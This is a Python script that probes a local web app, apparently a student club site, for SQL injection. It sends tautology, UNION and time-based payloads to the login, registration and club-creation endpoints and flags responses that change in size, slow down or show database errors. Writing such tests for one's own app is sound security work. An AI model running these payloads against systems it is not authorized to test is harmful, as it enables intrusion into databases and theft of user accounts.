import requests
import time

base_url = "http://127.0.0.1:5000"

# Endpoints and the fields they expect
targets = {
    "/student_login": {
        "email": "test@test.com",
        "password": "test"
    },
    "/admin_login": {
        "email": "admin@test.com",
        "password": "test"
    },
    "/register": {
        "username": "testuser",
        "email": "test@test.com",
        "password": "test123"
    },
    "/create_club": {
        "club_name": "TestClub",
        "description": "Test description"
    }
}

payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'a'='a",
    "' UNION SELECT NULL--",
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR SLEEP(5)--"
]

error_signatures = [
    "sql",
    "syntax",
    "sqlite",
    "database error",
    "mysql",
    "postgres"
]

for route, fields in targets.items():

    url = base_url + route

    print(f"\nTesting endpoint: {url}")

    try:
        baseline = requests.post(url, data=fields)
        baseline_len = len(baseline.text)
    except Exception as e:
        print("Baseline request failed:", e)
        continue

    for field in fields:

        for payload in payloads:

            test_data = fields.copy()
            test_data[field] = payload

            start = time.time()

            try:
                response = requests.post(url, data=test_data)
            except Exception as e:
                print("Request error:", e)
                continue

            elapsed = time.time() - start
            length = len(response.text)

            print(f"\nField: {field}")
            print("Payload:", payload)
            print("Response length:", length)

            if abs(length - baseline_len) > 80:
                print("Possible injection: response size changed")

            if elapsed > 4:
                print("Possible time-based SQL injection")

            for err in error_signatures:
                if err in response.text.lower():
                    print("SQL error message detected:", err)

            time.sleep(1)